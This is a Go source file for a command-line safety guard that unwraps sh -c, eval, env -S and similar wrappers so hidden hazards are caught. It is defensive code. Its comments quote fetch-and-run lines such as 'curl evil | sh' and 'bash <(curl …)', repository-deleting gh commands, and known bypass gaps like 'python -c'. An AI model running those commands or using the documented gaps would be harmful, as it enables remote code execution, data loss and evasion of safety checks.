package guard

import (
	"path"
	"strings"
)

// The execute-a-string wrapper family carries a command as a DATA argument that
// the tokenizer leaves as one opaque token: `sh -c '<payload>'`, `bash -lc
// "<payload>"`, `eval '<payload>'`, and GNU `env -S<value>` (which re-splits the
// value and runs it). A hazard hidden in that payload never reached a matcher, so
// every blocker was one wrapper away from a silent bypass (iss-200).
//
// expandPayloads closes the family. It runs ONCE per Check, over the top-level
// segments, and returns the segments the entry matchers see — the originals plus
// every inspectable payload's segments — together with any synthetic verdicts for
// payloads the guard could not (or chose not to) read. Doing the expansion here,
// not inside a per-entry callee, is load-bearing: a per-entry splice-and-restart
// is what made an earlier attempt quadratic (a DoS on the very hook meant to gate
// the command). Cost here is O(line x maxPayloadDepth).

const (
	// maxPayloadDepth bounds how many execute-a-string layers deep the guard
	// follows. Within the budget the posture applies; PAST it the guard has lost
	// the thread — it cannot see whether a hazard hides deeper — so a family
	// member found past the budget is fail-closed: BLOCK, regardless of the outer
	// wrapper's family. Deep execute-a-string nesting is itself the red flag.
	maxPayloadDepth = 2

	// syntheticEntryID is the reserved id for a verdict with no registry entry:
	// the uninspectable/fail-closed cases the Pattern language cannot express
	// ("the value contains a backslash"). No registry entry may claim this id, and
	// it must never be used to index Registry.Entries.
	syntheticEntryID = "execute-string-uninspectable"

	familyEnvS  = "env -S"
	familyShell = "sh -c"

	// interpreterStreamEntryID is the reserved id a shell reading its script
	// from a stream is refused under (readsScriptFromStdin). No registry entry
	// may claim it.
	interpreterStreamEntryID = "interpreter-reads-stream"

	familyInterpreterStream = "interpreter stream"
)

// payloadSignal is a synthetic verdict raised for a payload with no registry
// entry. It carries the family and the plain-language reason/remedy the report is
// built from. The raw payload is deliberately NOT carried: nothing reads it yet,
// and the later host-delegated interpretation adds the field when it adds a
// reader (wired-or-it-isn't-done).
type payloadSignal struct {
	// id is the reserved entry id the verdict is reported under. Empty means
	// syntheticEntryID — the execute-a-string family's own voice. Tier 2 sets it to
	// speculativeEntryID, because adr-42 decision 2 requires a reader to be able to
	// tell a speculative verdict from a literal one.
	id        string
	verdict   Verdict
	family    string
	reason    string
	successor string
}

// entryID is the id this signal is reported under.
func (s payloadSignal) entryID() string {
	if s.id == "" {
		return syntheticEntryID
	}
	return s.id
}

// expandPayloads expands every execute-a-string payload in segs once, appending
// each inspectable payload's segments in a disjoint chain range, and collecting a
// synthetic signal for each uninspectable or fail-closed payload.
func expandPayloads(segs []segment) ([]segment, []payloadSignal) {
	out := append([]segment(nil), segs...)
	var signals []payloadSignal

	// chainMax is the running maximum chain number across everything appended so
	// far. Each payload's fresh tokenize numbers its chains from 0, so a naive
	// append would collide indices and let an `after_cd` pattern false-fire across
	// a payload boundary; offsetting by chainMax+1 gives every payload a disjoint
	// range while preserving its own internal chain structure.
	chainMax := 0
	for _, s := range segs {
		if s.chain > chainMax {
			chainMax = s.chain
		}
	}

	type work struct {
		segs  []segment
		depth int
	}
	queue := []work{{segs: segs, depth: 0}}
	for len(queue) > 0 {
		item := queue[0]
		queue = queue[1:]
		for _, s := range item.segs {
			for _, ref := range payloadsOf(s) {
				kind, fam, payload, trailing := ref.kind, ref.family, ref.payload, ref.trailing
				// Past the depth budget the guard cannot follow the nesting, so a
				// family member here is fail-closed regardless of family.
				if item.depth+1 > maxPayloadDepth {
					signals = append(signals, depthBlockSignal(fam))
					continue
				}

				var psegs []segment
				switch kind {
				case kindEnvS:
					toks, inspectable := envInspect(payload, trailing)
					if !inspectable {
						signals = append(signals, envSpecialBlockSignal())
						continue
					}
					psegs = []segment{{tokens: toks}}
				case kindShell:
					sig, pseg, inspectable := shellInspect(payload)
					if !inspectable {
						signals = append(signals, sig)
					}
					if len(pseg) == 0 {
						continue
					}
					psegs = pseg
				case kindShellWarn:
					signals = append(signals, shellUnresolvedSignal())
					continue
				case kindExecString:
					// The payload is shell grammar (see execstring.go on how large a
					// claim that is), so it is inspected exactly as a shell payload is —
					// the same substitution and pipe-into-interpreter fail-safes apply.
					sig, pseg, inspectable := shellInspect(payload)
					if !inspectable {
						signals = append(signals, sig)
					}
					if len(pseg) == 0 {
						continue
					}
					psegs = pseg
				case kindExecStringWarn:
					signals = append(signals, execStringWarnSignal(fam))
					continue
				}

				// Offset the payload's chains into a fresh disjoint range and append.
				offset := chainMax + 1
				for i := range psegs {
					psegs[i].chain += offset
					if psegs[i].chain > chainMax {
						chainMax = psegs[i].chain
					}
				}
				out = append(out, psegs...)
				queue = append(queue, work{segs: psegs, depth: item.depth + 1})
			}
		}
	}
	return out, signals
}

const (
	kindEnvS = iota + 1
	kindShell
	kindShellWarn
	// kindExecString is a command string carried by a verb that is NOT a shell
	// (`su -c`, `runuser -c`, `script -c`, `flock -c`); kindExecStringWarn is one
	// whose value the guard could not locate.
	kindExecString
	kindExecStringWarn
)

// isShellFamily reports whether cmd is an interpreter whose `-c <string>` runs
// the string as an ordinary shell command line — the same grammar this package's
// tokenizer already parses. Membership decides whether the guard DESCENDS into a
// payload, so a name missing here is a silent allow for every hazard carried
// inside it.
//
// It is one predicate because it was two. The set lived written out at
// classifySegment and at pipesIntoInterpreter, naming only sh/bash/dash(/eval),
// so `zsh -c "gh repo delete owner/repo"` — zsh being the default login shell on
// macOS, one of the two systems this repo's CI runs on — was a confident, silent
// allow for every bundled blocker. Widening one site and not the other is how a
// fix reaches some sites and leaves the rest latent, so there is now nowhere to
// widen but here.
//
// SCOPE: this is the INTERPRETER set, not the wrapper set. A command that merely
// execs another (`nice`, `setsid`, `flock`, `busybox sh`, `su -c`, `script -c`)
// is handled by `wrappers` in match.go, which this does not touch and which has
// its own gaps — see iss-272. Do not read "nowhere left to widen" as covering
// those.
//
// These are true siblings of the original set: each runs its `-c` operand with
// the grammar already parsed, differing only by a name. A different LANGUAGE is
// not a sibling — `python -c` and `perl -e` carry source this tokenizer cannot
// read. Their recorded posture is a loud warn (see 04-surfaces/17-guard.md), but
// that posture is NOT YET IMPLEMENTED: today the payload is one opaque token that
// Tier 2's position-agnostic fail-safe never lands on, so a non-shell interpreter
// carrying a hazard is a SILENT ALLOW. Do not read the comment as describing
// shipped behaviour — it describes the target (iss-315).
//
// `eval` is not a member: it is a builtin, not an interpreter binary, and carries
// its own end-of-options rule, so it keeps its own branch.
func isShellFamily(cmd string) bool {
	// Folded to lower case: on a case-insensitive filesystem `BASH -c` /
	// `RBASH -c` resolve to and run the real interpreter, so a case-varied name
	// must descend into its payload exactly as the lowercase spelling does
	// (gh-315). rbash (restricted bash, a bash symlink on Debian/Ubuntu) and yash
	// (Yet Another Shell) are real POSIX shells whose `-c` runs the same grammar —
	// the unswept siblings of the closed zsh/ksh fix (gh-353).
	return containsString(shellFamily, strings.ToLower(cmd))
}

// shellFamily is the interpreter set isShellFamily tests; one list so the glob
// compare below and the literal one cannot drift apart. `eval` is not a member
// (see isShellFamily) and is tested separately where it matters.
var shellFamily = []string{"sh", "bash", "dash", "zsh", "ksh", "mksh", "ash", "rbash", "yash"}

// shellFamilyGlob resolves a globbed command name to the interpreter (or the
// eval builtin) it can expand to, fail-closed: the first name the pattern
// matches wins, which is enough because every member's payload is read the
// same way. Behind zsh's noglob the caller never asks.
func shellFamilyGlob(pattern string) (string, bool) {
	pattern = strings.ToLower(pattern)
	for _, name := range append(append([]string(nil), shellFamily...), "eval") {
		if globMatches(pattern, name) {
			return name, true
		}
	}
	return "", false
}

// payloadRef is one execute-a-string payload a segment can carry: its family,
// the payload text, and env's trailing operands for an `env -S` value. guessed
// records that the reading rests on GUESSING which program runs — a globbed
// name (`* -c <words>`, `s? -c <words>`) or a name a substitution prints
// (`$(x) -c <words>`). The pattern can expand to `sh`, and it can equally
// expand to a program nothing here names, so the payload is read, but only IN
// ADDITION to Tier 2: the unrecognised-launcher warn is what adr-42 decision 2
// keeps loud when the guard cannot say what runs the rest of the line, and
// letting the guess satisfy speculate's gate dropped it — `* -c gh api -X
// DELETE repos/owner/repo` went from a warn to a silent allow, because `sh -c`
// reads only `gh` as the payload and the operands after it become the
// payload's own positional parameters.
type payloadRef struct {
	kind     int
	family   string
	payload  string
	trailing []string
	guessed  bool
}

// carriesReadPayload reports whether the guard READ a payload the segment
// carries on a name it did not have to guess (payloadRef.guessed).
func carriesReadPayload(s segment) bool {
	for _, ref := range payloadsOf(s) {
		if !ref.guessed {
			return true
		}
	}
	return false
}

// singleStringLaunchers run a command handed to them as a single operand by
// passing it to `sh -c`: `watch '<cmd>'`, GNU `parallel '<cmd>' ::: args`. They
// are not shells (isShellFamily misses them) and not wrappers (their operand is a
// shell STRING, not an argv to exec), so a quoted payload was one opaque token
// that defeated even the Tier-2 fail-safe (gh-354). The value maps each launcher
// to its OWN option-argument flags, stepped over so the walk to the command
// operand is not derailed by an interval or a job count.
//
// Like `wrappers`, this is an UPGRADE, not the safety property: a launcher this
// map does not name still takes the Tier-2 posture. It is intentionally small.
var singleStringLaunchers = map[string][]string{
	"watch": {"-n", "--interval"},
	"parallel": {
		"-j", "--jobs", "-N", "-L", "--max-lines", "-n", "--max-args",
		"-I", "-d", "--delimiter", "-C", "--colsep", "--timeout", "--delay",
	},
}

// launcherPayloads returns the command STRINGS a single-string launcher hands
// to `sh -c`: its first non-option operand, but ONLY when that operand is a
// single token carrying a whole command line — the QUOTED form `watch 'git
// push --force'`. The unquoted, multi-token form spreads the command across
// argv, where Tier 2 already restarts at the real command and warns, so it is
// left to that path; classifying it here would switch the Tier-2 fail-safe off
// for the segment and silently allow it. valueFlags are stepped over so an
// interval or a job count is not read as the command operand. Each word is read
// as readWord reads it, every way it can be, from every index in starts (the
// word after each place the launcher can sit) in one walk, and every operand a
// reading reaches is returned.
func launcherPayloads(tokens []string, starts []int, valueFlags []string) []string {
	var out []string
	seen := map[int]bool{}
	stack := append([]int(nil), starts...)
	for len(stack) > 0 {
		i := stack[len(stack)-1]
		stack = stack[:len(stack)-1]
		if i >= len(tokens) || seen[i] {
			continue
		}
		seen[i] = true
		tally(1)
		a := tokens[i]
		if a == "--" {
			if i+1 < len(tokens) {
				if p, ok := packedCommand(tokens[i+1]); ok {
					out = append(out, p)
				}
			}
			continue
		}
		r := readWord(a, valueFlags)
		if a == "-" {
			r = wordReadings{operand: true}
		}
		if r.vanish || r.flag {
			stack = append(stack, i+1)
		}
		if r.takes {
			stack = append(stack, i+2) // its value belongs to the launcher, not to command position
		}
		if r.operand {
			if p, ok := packedCommand(a); ok {
				out = append(out, p)
			}
		}
	}
	return out
}

// packedCommand accepts an operand as a shell payload only when it carries
// whitespace — the mark of a quoted command line packed into one token. Every
// registry hazard needs at least two tokens, so a whitespace-free operand can
// carry none of them, and reading it as a payload would only shadow the Tier-2
// warn the unquoted form already earns.
func packedCommand(op string) (string, bool) {
	if strings.ContainsAny(op, " \t\n\r") {
		return op, true
	}
	return "", false
}

// payloadsOf returns every execute-a-string payload a raw segment can carry,
// reading every place its command can sit (commandArrivals) and every program
// the name there can be (nameCouldBe): a name a substitution prints is any of
// them, so each family's reading is taken.
//
// env -S and the exec-string verbs are read on the raw token chain, at every
// arrival, because env, runuser and flock are also wrappers, and the command
// walk steps through a wrapper to the command it runs — reading the payload
// string as that command. A shell's `-c`, eval, and the single-string launchers
// are read at each command site. Each family reads the words after all the
// places it can sit in ONE walk (the scans take a list of starts), so a line
// whose command an unknown word puts in several places costs what one does.
//
// A globbed interpreter name (`s? -c '<hazard>'`) is read as the pattern it
// is, for the same reason matchSegment reads a globbed command name: bash
// expands it before exec, and a payload behind a name this lookup does not
// open is one opaque token nothing else reaches — a SILENT allow, unlike a
// globbed wrapper name, which Tier 2 still warns on. That reading, like one
// on a name a substitution prints, is a guess (payloadRef.guessed).
func payloadsOf(s segment) []payloadRef {
	var out []payloadRef
	add := func(kind int, family, payload string, trailing []string, guessed bool) {
		out = append(out, payloadRef{kind: kind, family: family, payload: payload, trailing: trailing, guessed: guessed})
	}
	arrivals := arrivalsOf(s)
	// starts returns the word after every arrival (or command site) whose name
	// can be one of names, split by whether the name was guessed.
	starts := func(at []arrival, names ...string) (known, guessed []int) {
		for _, a := range at {
			tok := s.tokens[a.idx]
			if !nameCouldBeAny(tok, names) {
				continue
			}
			if isUnknown(tok) {
				guessed = append(guessed, a.idx+1)
			} else {
				known = append(known, a.idx+1)
			}
		}
		return known, guessed
	}

	envKnown, envGuessed := starts(arrivals, "env")
	for _, v := range scanEnvSplits(s.tokens, envKnown) {
		add(kindEnvS, familyEnvS, v.value, v.trailing, false)
	}
	for _, v := range scanEnvSplits(s.tokens, envGuessed) {
		add(kindEnvS, familyEnvS, v.value, v.trailing, true)
	}
	out = append(out, execStringPayloads(s.tokens, arrivals)...)

	sites := commandSites(s)
	// A shell's `-c`: literal names, globbed names that can expand to one, and
	// names a substitution prints.
	var shellKnown, shellGuessed []int
	var evalKnown []int
	firstUnknown := -1
	for _, a := range sites {
		tok := s.tokens[a.idx]
		cmd := path.Base(tok)
		switch {
		case isUnknown(tok):
			if firstUnknown < 0 {
				firstUnknown = a.idx
			}
			shellGuessed = append(shellGuessed, a.idx)
		case nameCouldBeAny(tok, shellFamily):
			shellKnown = append(shellKnown, a.idx)
		case cmd == "eval":
			evalKnown = append(evalKnown, a.idx)
		case !a.noglob && s.globAt(a.idx):
			if name, ok := shellFamilyGlob(cmd); ok {
				if name == "eval" {
					if p, ok := evalPayload(s.tokens[a.idx+1:]); ok {
						add(kindShell, familyShell, p, nil, true)
					}
				} else {
					shellGuessed = append(shellGuessed, a.idx)
				}
			}
		}
	}
	for _, i := range evalKnown {
		if p, ok := evalPayload(s.tokens[i+1:]); ok {
			add(kindShell, familyShell, p, nil, false)
		}
	}
	// A name a substitution prints can be eval. Its payload is read at the
	// first such place only: every later one's words are in it, where the walk
	// inside the payload reaches them the same way.
	if firstUnknown >= 0 {
		if p, ok := guessedEvalPayload(s.tokens[firstUnknown+1:]); ok {
			add(kindShell, familyShell, p, nil, true)
		}
	}
	for _, group := range []struct {
		sites   []int
		guessed bool
	}{{shellKnown, false}, {shellGuessed, true}} {
		if len(group.sites) == 0 {
			continue
		}
		values, unresolved := shellCPayloads(s.tokens, group.sites)
		for _, p := range values {
			add(kindShell, familyShell, p, nil, group.guessed)
		}
		if unresolved {
			// A `-c` string is present but its operand could not be located;
			// fail safe to a loud WARN, never a silent allow.
			add(kindShellWarn, familyShell, "", nil, group.guessed)
		}
	}
	// watch/parallel hand a single quoted operand to `sh -c`, so the packed
	// command string is inspected exactly as a shell payload is (gh-354). The
	// lookup is folded for the same reason isShellFamily is: `WATCH` runs on a
	// case-insensitive filesystem (gh-315).
	for _, name := range []string{"parallel", "watch"} {
		known, guessed := starts(sites, name)
		for _, p := range launcherPayloads(s.tokens, known, singleStringLaunchers[name]) {
			add(kindShell, familyShell, p, nil, false)
		}
		for _, p := range launcherPayloads(s.tokens, guessed, singleStringLaunchers[name]) {
			add(kindShell, familyShell, p, nil, true)
		}
	}
	return out
}

// splitStringValue returns the first `env -S` value a raw segment carries and
// env's trailing operands (payloadsOf reads them all).
func splitStringValue(tokens []string) (string, []string, bool) {
	var starts []int
	for _, a := range commandArrivals(tokens) {
		if nameCouldBe(tokens[a.idx], "env") {
			starts = append(starts, a.idx+1)
		}
	}
	if vs := scanEnvSplits(tokens, starts); len(vs) > 0 {
		return vs[0].value, vs[0].trailing, true
	}
	return "", nil, false
}

// envSplit is one `env -S` value and env's operands after it, which env
// appends to the split argv.
type envSplit struct {
	value    string
	trailing []string
}

// scanEnvSplits scans the option tokens of every env the walk can arrive at
// (from each index in starts, in one walk) for a split-string flag in any of its spellings: separate `-S <v>`, glued `-S<v>`,
// the `--split-string=<v>` and `--s`...`--split-string` prefix range, and a
// short cluster carrying S (`-iS<v>`, `-iS <v>`). It returns every RAW value a
// reading finds with env's trailing operands after it — or none when this env
// carries no split-string flag. The scan stops at command position so it never
// reads the launched command's own arguments. Every env in the chain is read
// (commandArrivals steps an env carrying no split-string flag as an ordinary
// wrapper), so `env -i env -S <v>` reaches the inner env.
//
// A word is read as unknown.go reads it: an unknown dash-word may be the
// split-string flag with its value glued on, a value the guard cannot see and
// envInspect refuses, and otherwise may be any other option, value-taking or
// not.
func scanEnvSplits(tokens []string, starts []int) []envSplit {
	var out []envSplit
	found := func(value string, end int) {
		if end > len(tokens) {
			end = len(tokens)
		}
		out = append(out, envSplit{value: value, trailing: tokens[end:]})
	}
	seen := map[int]bool{}
	stack := append([]int(nil), starts...)
	for len(stack) > 0 {
		i := stack[len(stack)-1]
		stack = stack[:len(stack)-1]
		if i >= len(tokens) || seen[i] {
			continue
		}
		seen[i] = true
		tally(1)
		tok := tokens[i]
		if tok == "--" || tok == "-" {
			continue // command/operand position: no split flag here
		}
		if isUnknown(tok) {
			// A word that can be the split-string flag can carry its value
			// glued on, where the guard cannot read it: that value is not a
			// plain command, which refuses the segment (envInspect), so it is
			// the one reading returned, and the scan need look no further.
			if flagCouldBe(tok, "--split-string") || unknownFlagCouldBe(tok, "--s") || clusterCouldCarry(tok, 'S') {
				found(tok, i+1)
				return out
			}
			r := readWord(tok, envValueFlags)
			if r.vanish || r.flag {
				stack = append(stack, i+1)
			}
			if r.takes {
				stack = append(stack, i+2)
			}
			continue
		}
		if !strings.HasPrefix(tok, "-") {
			continue // command/operand position: no split flag here
		}
		if strings.HasPrefix(tok, "--") {
			name, val, hasEq := splitLongOpt(tok)
			if isSplitStringLong(name) {
				switch {
				case hasEq:
					found(val, i+1)
				case i+1 < len(tokens):
					found(tokens[i+1], i+2)
				default:
					found("", i+1)
				}
				continue
			}
			if !hasEq && longEnvTakesValue(name) {
				stack = append(stack, i+2) // its value is the next token, not command position
			} else {
				stack = append(stack, i+1)
			}
			continue
		}
		val, gluedVal, isSplit, takesNext := shortClusterSplit(tok)
		if isSplit {
			switch {
			case gluedVal:
				found(val, i+1)
			case i+1 < len(tokens):
				found(tokens[i+1], i+2)
			default:
				found("", i+1)
			}
			continue
		}
		if takesNext {
			stack = append(stack, i+2) // a value-taking short flag other than S ended the cluster
		} else {
			stack = append(stack, i+1)
		}
	}
	return out
}

// envValueFlags are env's own options that take the next word as their value.
var envValueFlags = []string{"-u", "-C", "-a", "--unset", "--chdir", "--argv0", "-S", "--split-string"}

// splitLongOpt splits `--name=value` into its parts; without an `=` the whole
// token is the name.
func splitLongOpt(tok string) (name, val string, hasEq bool) {
	if eq := strings.IndexByte(tok, '='); eq >= 0 {
		return tok[:eq], tok[eq+1:], true
	}
	return tok, "", false
}

// isSplitStringLong reports whether a long-option name is an unambiguous
// abbreviation of --split-string. getopt_long accepts any non-ambiguous prefix,
// and --split-string is env's only long option beginning with "s", so every
// prefix from --s down to the full spelling means split-string.
func isSplitStringLong(name string) bool {
	return len(name) >= 3 && strings.HasPrefix("--split-string", name)
}

// longEnvTakesValue reports whether one of env's long options consumes the
// FOLLOWING token as its value (`env --chdir /x -S <v>`), so the scan steps over
// the value rather than reading it as command position and missing a later -S.
func longEnvTakesValue(name string) bool {
	switch name {
	case "--unset", "--chdir", "--argv0":
		return true
	}
	return false
}

// shortClusterSplit inspects a short-option cluster (`-i`, `-iS`, `-iSval`, `-u`)
// for env's split-string flag S. isSplit reports S is present; gluedVal reports
// its value was attached in the same token, in which case val holds it; when S is
// present but not glued the value is the next token. takesNext reports that,
// absent S, the cluster ended on a different value-taking short flag whose value
// is the next token, so the caller steps over it.
func shortClusterSplit(tok string) (val string, gluedVal, isSplit, takesNext bool) {
	for j := 1; j < len(tok); j++ {
		c := tok[j]
		if c == 'S' {
			rest := tok[j+1:]
			return rest, rest != "", true, false
		}
		// env's other value-taking short flags: -u NAME, -C DIR, -a ARG. A glued
		// value consumes the rest of the cluster; otherwise the next token is the
		// value. Either way the cluster ends and there is no S beyond it.
		if c == 'u' || c == 'C' || c == 'a' {
			if j+1 < len(tok) {
				return "", false, false, false
			}
			return "", false, false, true
		}
		// A boolean short flag (-i, -0, -v, -P): keep scanning the cluster.
	}
	return "", false, false, false
}

// envInspect decodes an env -S value against env's fixed escape table and, when
// the decoded value passes the plain-command whitelist, splits it on whitespace
// and appends env's trailing operands. The second return is false — meaning env
// uninspectable, which the caller turns into a fail-closed BLOCK — whenever the
// value is not provably plain. Over-blocking is the fail-safe direction; a
// guess-and-allow (an earlier attempt) or a guess-and-warn is not.
func envInspect(value string, trailing []string) ([]string, bool) {
	decoded, ok := decodeEnvS(value)
	if !ok || !isPlainCommand(decoded) {
		return nil, false
	}
	return append(strings.Fields(decoded), trailing...), true
}

// decodeEnvS decodes GNU env's finite -S escape table. ok is false on any escape
// outside the table (a residual backslash env itself would reject), so an
// unknown escape fails closed rather than being left literal.
func decodeEnvS(raw string) (string, bool) {
	if !strings.ContainsRune(raw, '\\') {
		return raw, true
	}
	var b strings.Builder
	for i := 0; i < len(raw); i++ {
		c := raw[i]
		if c != '\\' {
			b.WriteByte(c)
			continue
		}
		if i+1 >= len(raw) {
			return "", false // trailing backslash
		}
		i++
		switch raw[i] {
		case '_':
			b.WriteByte(' ')
		case 't':
			b.WriteByte('\t')
		case 'n':
			b.WriteByte('\n')
		case 'r':
			b.WriteByte('\r')
		case 'f':
			b.WriteByte('\f')
		case 'v':
			b.WriteByte('\v')
		case '#':
			b.WriteByte('#')
		case '\\':
			b.WriteByte('\\')
		case '$':
			b.WriteByte('$')
		default:
			return "", false // an escape env would reject; fail closed
		}
	}
	return b.String(), true
}

// isPlainCommand is the env-special WHITELIST gate: split-and-match runs ONLY
// when the escape-decoded value is provably a plain command line. Anything else —
// a residual backslash, a `$` expansion (whether decoded from `\$` or a bare
// `$VAR`), a quote env would remove, a leading `-` env would re-parse as an
// option, or a `#` comment — fails the gate and the caller blocks. This is a
// whitelist, not a denylist: a novel env-special form cannot slip through by not
// being on a list of known-special constructs.
func isPlainCommand(s string) bool {
	trimmed := strings.TrimLeft(s, " \t\n\r\f\v")
	if trimmed == "" || trimmed[0] == '-' {
		return false
	}
	for i := 0; i < len(s); i++ {
		switch s[i] {
		case '\\', '$', '\'', '"', '#', unknownMark:
			return false
		}
	}
	return true
}

// evalPayload returns the arguments eval joins and runs. A single leading `--`
// (end-of-options) is dropped before the operands are joined; `eval --
// '<payload>'` tokenized to command `--` and allowed.
func evalPayload(args []string) (string, bool) {
	if len(args) > 0 && args[0] == "--" {
		args = args[1:]
	}
	if len(args) == 0 {
		return "", false
	}
	return strings.Join(args, " "), true
}

// guessedEvalPayload is evalPayload for a name a substitution prints, which
// can be eval. Its arguments are read as a command line only when one carries
// a packed command line (whitespace, the mark of a quoted string), because
// re-reading plain words finds only what the walk to command position already
// reads in them — each of them is a place a command can sit behind a program of
// unknown name (commandArrivals). A word that is nothing but a substitution is
// left out: it may print nothing, and re-reading it as unknown text would only
// nest the same reading one payload deeper.
func guessedEvalPayload(args []string) (string, bool) {
	var words []string
	packed := false
	for i, a := range args {
		if i == 0 && a == "--" {
			continue
		}
		if vanishable(a) {
			continue
		}
		if _, ok := packedCommand(a); ok {
			packed = true
		}
		words = append(words, a)
	}
	if !packed {
		return "", false
	}
	return strings.Join(words, " "), true
}

// shellCPayloads extracts the command strings an sh/bash/dash `-c` (or `-lc`,
// `-ic`, ...) can run.
//
// The command string is the shell's FIRST NON-OPTION operand per POSIX getopt
// — not the token that merely follows `-c`. An option split into its own token
// after `-c` (`sh -c -x '<payload>'`, `bash -c -- '<payload>'`) otherwise hid
// the payload behind `-x`/`--` and every blocker inside it was one spelling
// away from a silent allow (iss-200). A word that can be a cluster carrying
// `c` (clusterCouldCarry) opens the operand walk, so `bash -$(x) '<payload>'`
// and `bash -c$(x) '<payload>'` are read as the `-c` they can be. unresolved
// reports a `-c` whose operand could not be located, which the caller warns
// on instead of guessing.
func shellCPayloads(tokens []string, sites []int) (values []string, unresolved bool) {
	var starts []int
	scanned := -1 // the words up to here were read from an earlier site
	for _, site := range sites {
		if site < scanned {
			continue // an earlier site's scan covers every word this one reads
		}
		scanned = len(tokens)
		for i := site + 1; i < len(tokens); i++ {
			a := tokens[i]
			if !clusterCouldCarry(a, 'c') {
				continue
			}
			starts = append(starts, i+1)
			if !isUnknown(a) {
				scanned = i // the shell's own `-c`: what follows it is its operand walk
				break
			}
		}
	}
	if len(starts) == 0 {
		return nil, false
	}
	return shellOperands(tokens, starts)
}

// shellValueOptions are the shell options that take the next word as their
// value: `set -o NAME`, `bash -O SHOPT`.
var shellValueOptions = []string{"-o", "-O", "+o", "+O"}

// shellOperands walks a shell's tokens after the `-c` cluster — from each
// index in starts, one walk for all of them — and returns the words that can
// be its first non-option operand — the command string. Boolean
// option clusters (`-x`, `-e`) are stepped over and a bare `--` ends options so
// the next token is the operand. An option that appears to consume a following
// argument (`-o pipefail`, `-O extglob`), an unrecognised option, or the absence
// of any operand means the command string cannot be confidently located:
// unresolved routes to a loud WARN, never a guess-and-allow. An unknown word is
// read every way readWord reads it — a boolean, an option taking a value, the
// operand itself, or no word — and every operand a reading reaches is returned.
func shellOperands(rest []string, starts []int) (values []string, unresolved bool) {
	seen := map[int]bool{}
	var stack []int
	for _, st := range starts {
		if st < len(rest) {
			stack = append(stack, st)
		}
		// `sh -c` with nothing after it: nothing to inspect.
	}
	for len(stack) > 0 {
		i := stack[len(stack)-1]
		stack = stack[:len(stack)-1]
		if seen[i] {
			continue
		}
		seen[i] = true
		tally(1)
		if i >= len(rest) {
			unresolved = true // options only, no operand found
			continue
		}
		tok := rest[i]
		switch {
		case tok == "--":
			if i+1 < len(rest) {
				values = append(values, rest[i+1]) // end of options: next token is the operand
			} else {
				unresolved = true // `-c --` with no operand
			}
		case isUnknown(tok):
			r := readWord(tok, shellValueOptions)
			if r.vanish || r.flag {
				stack = append(stack, i+1)
			}
			if r.takes {
				stack = append(stack, i+2)
			}
			if r.operand {
				values = append(values, tok)
			}
		case len(tok) >= 2 && (tok[0] == '-' || tok[0] == '+'):
			if shellClusterBoolean(tok[1:]) {
				stack = append(stack, i+1) // a boolean option cluster is not the command string
			} else {
				unresolved = true // arg-taking or unknown option: operand unlocatable
			}
		default:
			values = append(values, tok) // first non-option operand: the command string
		}
	}
	return values, unresolved
}

// shellBooleanFlags are the single-letter shell set-options that consume NO
// following argument. The only single-letter shell options that DO take an
// argument are `-o`/`-O` (`set -o NAME`, `bash -O SHOPT`); a cluster carrying
// either — or any character outside this set — is treated as unlocatable and
// routed to the fail-safe WARN rather than stepped over as if boolean. This is an
// allowlist by design: an unknown flag fails safe (WARN), never silent-allow.
const shellBooleanFlags = "abefhiklmnprstuvxBCDEHPT"

// shellClusterBoolean reports whether every character of a short-option cluster
// (the token after its leading `-`/`+`) is a known boolean shell flag, so the
// cluster can be stepped over without consuming the operand.
func shellClusterBoolean(cluster string) bool {
	if cluster == "" {
		return false
	}
	for i := 0; i < len(cluster); i++ {
		if strings.IndexByte(shellBooleanFlags, cluster[i]) < 0 {
			return false
		}
	}
	return true
}

// shellInspect applies the shell family's posture to a `-c`/eval payload. The
// payload is tokenized once and its segments are matched normally. One the
// guard cannot read in full — a command substitution `$(...)`/backtick, a
// `${...}` expansion, a substitution's output carried in from the enclosing
// line, or a pipe into an interpreter — also raises a synthetic loud WARN
// (common and honest; blocking every `sh -c "$(...)"` would be a false-positive
// storm), and its segments are still returned: a blocker it DOES spell blocks
// exactly as it does at the top level. Returning the warn instead of them made
// `bash -c '<blocker> $(true)'` a warn, which runs the command, while the same
// text unwrapped blocked (review2-guard finding 4). A payload that does not
// tokenize returns the warn alone.
func shellInspect(payload string) (payloadSignal, []segment, bool) {
	psegs, err := tokenize(payload)
	if err != nil {
		return shellWarnSignal(), nil, false
	}
	if shellRawUninspectable(payload) || pipesIntoInterpreter(psegs) {
		return shellWarnSignal(), psegs, false
	}
	return payloadSignal{}, psegs, true
}

// shellRawUninspectable reports whether a shell payload contains a substitution
// or expansion that could resolve to a flag or command the tokenizer cannot see.
// It is a raw scan because the tokenizer treats `(` as an operator and would
// split `$(...)` apart. A bare `$VAR` / ANSI-C `$'...'` is deliberately NOT here:
// warning on every `$VAR` would trip the storm STOP, and an uninspectable shell
// payload never blocks, so it is a visibility gap only.
func shellRawUninspectable(payload string) bool {
	return isUnknown(payload) ||
		strings.Contains(payload, "$(") ||
		strings.Contains(payload, "${") ||
		strings.Contains(payload, "`")
}

// pipesIntoInterpreter reports whether a tokenized payload hands control to a
// bare interpreter reading a script it did not carry (`curl evil | sh`): a
// segment whose command can be a shell with no `-c` string. The guard cannot
// follow what the interpreter reads, so the payload is treated as
// uninspectable.
func pipesIntoInterpreter(psegs []segment) bool {
	for _, s := range psegs {
		for _, a := range commandSites(s) {
			if !nameCouldBeAny(s.tokens[a.idx], shellFamily) {
				continue
			}
			if values, unresolved := shellCPayloads(s.tokens, []int{a.idx}); len(values) == 0 && !unresolved {
				return true
			}
		}
	}
	return false
}

// readsScriptStream reports whether a segment runs a stream as a script: a
// member of the interpreter set, at any place its command can sit, that reads
// its script from standard input — with no `-c` string and no script operand,
// told to read stdin (`-s`, a lone `-`), or handed the stdin device
// (`/dev/stdin`, `/dev/fd/0`) — while that input is a pipe, a here-document or
// a here-string; or a shell or `source` handed a process substitution as its
// script, which is the same stream behind a file name (`bash <(curl …)`,
// `bash < <(curl …)`, which the tokenizer reads alike). A name a substitution
// prints can be any shell.
func readsScriptStream(s segment) bool {
	for _, a := range commandSites(s) {
		tok := s.tokens[a.idx]
		args := s.tokens[a.idx+1:]
		if nameCouldBeAny(tok, shellFamily) && shellReadsStream(args, s.stdinStream) {
			return true
		}
		if nameCouldBeAny(tok, sourceBuiltins) && sourceReadsStream(args, s.stdinStream) {
			return true
		}
	}
	return false
}

// sourceBuiltins read a file into the running shell: a script by another name.
var sourceBuiltins = []string{"source", "."}

// stdinDevices are the file names that are a process's own standard input.
